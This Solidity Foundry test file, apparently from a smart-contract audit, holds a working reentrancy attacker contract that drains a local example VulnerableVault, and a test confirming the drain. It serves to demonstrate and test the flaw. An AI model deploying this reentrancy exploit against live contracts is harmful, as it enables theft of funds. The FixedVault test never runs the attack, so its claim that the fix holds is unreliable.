// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";
import "../src/FixedVault.sol";

/// @notice Contrat d'attaque utilisé uniquement en test local sur un contrat d'exemple.
contract Attacker {
    VulnerableVault public vault;

    constructor(VulnerableVault _v) {
        vault = _v;
    }

    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }
}

contract AuditTest is Test {
    // Démontre que la reentrancy vide le VulnerableVault au-delà du dépôt légitime
    function testReentrancyDrainsVulnerableVault() public {
        VulnerableVault vault = new VulnerableVault();
        vm.deal(address(this), 10 ether);
        vault.deposit{value: 5 ether}();

        Attacker attacker = new Attacker(vault);
        vm.deal(address(attacker), 1 ether);
        attacker.attack();

        assertLt(address(vault).balance, 5 ether);
    }

    // Le FixedVault conserve les fonds (le verrou nonReentrant bloque la réentrance)
    function testFixedVaultKeepsFunds() public {
        FixedVault vault = new FixedVault();
        vm.deal(address(this), 10 ether);
        vault.deposit{value: 5 ether}();
        assertEq(address(vault).balance, 5 ether);
    }
}
